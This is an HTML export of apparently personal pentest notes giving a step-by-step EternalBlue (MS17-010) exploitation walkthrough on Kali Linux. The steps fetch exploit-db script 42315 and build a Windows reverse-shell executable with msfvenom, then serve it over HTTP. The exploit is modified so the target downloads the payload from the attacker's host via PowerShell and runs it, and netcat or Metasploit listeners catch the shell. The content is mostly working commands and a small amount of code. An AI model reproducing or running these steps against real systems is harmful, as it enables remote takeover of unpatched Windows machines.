<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>example of how to delivery the exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>example of how to delivery the exploit</h1><br /><br />1. Search exploit<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;searchsploit&nbsp;ms17-010</div>
    </div><br /> <a href=""><img src="images/1269-1.png" alt="images/1269-1.png" /></a><br /><br />2. Copy(mirror) the
    exploit in the actual folder<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;searchsploit&nbsp;-m&nbsp;42315</div>
    </div> <br /> <a href=""><img src="images/1269-2.png" alt="images/1269-2.png" /></a><br /><br />3. Edit the file, in
    this case we need to add to it the credentials<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;mousepad&nbsp;42315.py</div>
    </div><br /> <a href=""><img src="images/1269-3.png" alt="images/1269-3.png" /></a><br /> <br />4. We need to import
    the smb.py in the same folder of the exploit, otherwise it give us an error<br /> <a href=""><img
        src="images/1269-4.png" alt="images/1269-4.png" /></a><br /> As we can from inside the file we can download the
    file from <br /> <a href=""><img src="images/1269-5.png" alt="images/1269-5.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;wget&nbsp;https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py&nbsp;-O&nbsp;mysmb.py
      </div>
    </div><br /> <a href=""><img src="images/1269-6.png" alt="images/1269-6.png" /></a> <br /> Ok now it works!<br /> <a
      href=""><img src="images/1269-7.png" alt="images/1269-7.png" /></a><br /><br />5. Proof of of concept that work.
    It only create pwned.txt file on the remote machine! To do more, we have to edit the code<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;python&nbsp;42315.py&nbsp;192.168.147.136</div>
    </div><br /> <a href=""><img src="images/1269-8.png" alt="images/1269-8.png" /></a><br /><br />6. Custom Payload
    with msfvenom<br />
    <div class="codebox">
      <div class="codebox">
        msfvenom&nbsp;-a&nbsp;x86&nbsp;-p&nbsp;windows/shell_reverse_tcp&nbsp;lhost=192.168.147.139&nbsp;lport=4321&nbsp;-f&nbsp;exe&nbsp;-o&nbsp;/var/www/html/sc.exe
      </div>
    </div><br /> for x64 systems there is the payload: windows/x64/shell_reverse_tcp<br /> <a href=""><img
        src="images/1269-9.png" alt="images/1269-9.png" /></a><br />9. Set up HTTP server on the folder where we have
    saved the payload <br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;cd&nbsp;/var/www/html/<br />root@kali:/#&nbsp;ls<br />root@kali:/#&nbsp;python3&nbsp;-m&nbsp;http.server&nbsp;80&nbsp;-d&nbsp;/var/www/html
      </div>
    </div><br /> <a href=""><img src="images/1269-10.png" alt="images/1269-10.png" /></a><br /><br />8. Edit the exploit
    file(42315.py)<br />This is the code that is responsible for connecting to the target and creating the text file.
    Because we do not want only create a file on the target machine, we have to edit this part of code.<br />We can see
    that there is a commented out function, service_exec(), We can use this function to grab our payload and execute it
    on the target.<br />Before:<br /> <a href=""><img src="images/1269-11.png"
        alt="images/1269-11.png" /></a><br />After: <br />
    <div class="codebox">
      <div class="codebox">
        service_exec(conn,&nbsp;r&quot;cmd&nbsp;/c&nbsp;powershell&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&#39;http://192.168.147.139/sc.exe&nbsp;&#39;,&#39;C:\Users\pparker\Desktop\sc.exe&nbsp;&#39;);&quot;)<br />service_exec<span
          style="color:#000000;font-weight:400">(</span>conn,&nbsp;r&#39;cmd&nbsp;/c&nbsp;C:\Users\pparker\Desktop\sc.exe&#39;<span
          style="color:#000000;font-weight:400">)</span></div>
    </div><br /> <a href=""><img src="images/1269-12.png" alt="images/1269-12.png" /></a><br /> powershell (new-object
    System.Net.WebClient).DownloadFile(&#39;<a href="http://192.168.147.139/sc.exe">http://192.168.147.139/sc.exe</a>
    &#39;,&#39;C:\Users\pparker\Desktop\sc.exe &#39;); <br /><br />9. Start a Listener on the Attacker machine<br />
    <span style="text-decoration:underline;">Staged payloads</span> use &quot;tiny stagers&quot; to fit into small
    exploitation spaces and pull the rest of the payload. <span style="text-decoration:underline;">Stageless
      payloads</span> or &quot;inline payloads&quot; are self-contained, no stager and more stable. So with a <em>netcat
      listener</em>, the stager fails to pull the rest of the payload. That&#39;s when the msf multi/handler is
    useful.<br /> ◇ Unstaged payloads → It is fine use netcat<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-vlp&nbsp;<span
          style="color:#000000;font-weight:400">[</span>port&nbsp;number<span
          style="color:#000000;font-weight:400">]</span></div>
    </div><br /> <a href=""><img src="images/1269-13.png" alt="images/1269-13.png" /></a><br /> ◇ Staged payloads → They
    does not work with netcat, because of that we need to use exploit/multi/handler in Metasploit to catch shells<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;msfconsole<br />msf&gt;&nbsp;use&nbsp;exploit/multi/handler<br />msf&gt;&nbsp;set&nbsp;payload&nbsp;payload/windows/shell/reverse_tcp<br />msf&gt;&nbsp;set&nbsp;lhost&nbsp;&lt;localIP&gt;<br />msf&gt;&nbsp;set&nbsp;lport&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>liseningPort<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /><br />10. Now we can run the python<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;python&nbsp;42315.py&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>TargetIp<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <a href=""><img src="images/1269-14.png" alt="images/1269-14.png" /></a><br />11. Now we should have
    received a shell on the listener of point 9<br /> <a href=""><img src="images/1269-15.png"
        alt="images/1269-15.png" /></a><br /> <br /> <br />Bibliography: <br /><a
      href="https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/" target="_blank">https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/</a><br /><br />
  </div>
</body>

</html>